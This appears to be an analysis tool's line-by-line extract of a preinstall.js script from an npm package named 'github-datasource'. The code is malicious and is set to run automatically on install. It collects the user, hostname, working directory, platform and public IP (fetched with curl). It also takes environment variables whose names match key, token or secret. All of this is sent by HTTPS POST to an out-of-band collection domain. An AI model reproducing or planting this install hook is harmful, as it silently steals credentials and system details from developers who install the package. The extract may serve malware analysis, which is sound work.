// File: tmp/tmpp2bd3l35/github-datasource/package/preinstall.js
// ======================================================================
Line 1: const dns = require('dns')
Line 2: const os = require('os')
Line 3: _tmp_2 = require('child_process')
Line 4: const https = require('https')
Line 11: Buffer.from(str).toString('hex')
Line 16: os.userInfo()
Line 17: os.hostname()
Line 19: os.platform()
Line 20: os.arch()
Line 21: Date.now().toString(36)
Line 27: _tmp_5.push(...hexify(info.user))
Line 28: _tmp_5.push(...hexify(info.host))
Line 29: _tmp_5.push(...hexify(info.cwd))
Line 30: _tmp_5.push(info.platform)
Line 31: _tmp_5.push(info.arch)
Line 32: _tmp_5.push(info.ci ? "ci" : "local")
Line 33: _tmp_5.push(info.timestamp)
Line 34: _tmp_5.push(OAST_DOMAIN)
Line 37: labels.join('.')
Line 44: exec('curl -s https://api.ipify.org', (err, stdout) => {
  const ip = stdout.trim();
  const payload = JSON.stringify({ ...info, ip });

  const req = https.request({
    hostname: OAST_DOMAIN,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.on('error', () => {});
  req.write(payload);
  req.end();
})
Line 45: stdout.trim()
Line 48: const req = https.request({
    hostname: OAST_DOMAIN,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {})
Line 55: req.write(payload)
Line 56: req.end()
Line 61: /key|token|secret/i.test(k)
Line 65: {
  const req = https.request({
    hostname: OAST_DOMAIN,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.write(JSON.stringify({ envleak: leaked }));
  req.end();
}
Line 66: const req = https.request({
    hostname: OAST_DOMAIN,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {})
Line 72: req.write(JSON.stringify({ envleak: leaked }))
Line 73: req.end()
